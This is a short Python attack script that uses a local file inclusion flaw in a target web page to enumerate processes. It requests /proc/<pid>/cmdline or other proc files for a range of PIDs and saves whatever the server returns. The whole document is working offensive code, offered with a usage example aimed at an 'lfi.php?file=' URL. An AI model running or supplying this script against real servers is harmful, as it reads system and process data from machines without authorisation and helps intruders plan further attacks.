#!/usr/bin/env python
import sys
import requests

if len(sys.argv) != 5:
    print ('[!] Missing parameter!')
    print ('[*] Syntax: pidenum.py [URL] [max_PID_count] [proc_file] [output_file]')
    print ('[*] Example: pidenum.py http://10.0.0.5/lfi.php?file= 2000 cmdline results.txt\n')
    sys.exit()

url = sys.argv[1]
pidtries = sys.argv[2]
procfile = sys.argv[3]
outputfilename = sys.argv[4]
resultsfile = open(outputfilename, mode = "w", encoding = "utf-8")
pid=1

try: 
    
    while pid <= int(pidtries):
        r = requests.get(url+ '/proc/' + str(pid) + '/' + procfile)      
        if len (r.text) > 1:
            resultsfile.write ('[*] PID: ' + str(pid) + '\n')
            resultsfile.write ('[*] URL: ' + r.url + '\n')
            resultsfile.write ('[*] ' + procfile + ': ' + r.text + '\n')        
        pid += 1
        
    resultsfile.close()
    print ('[*] Completed successfully!')
    print ('[*] Results saved to ' + outputfilename + '\n')

except: print ('*[Error] Bad Argument!')


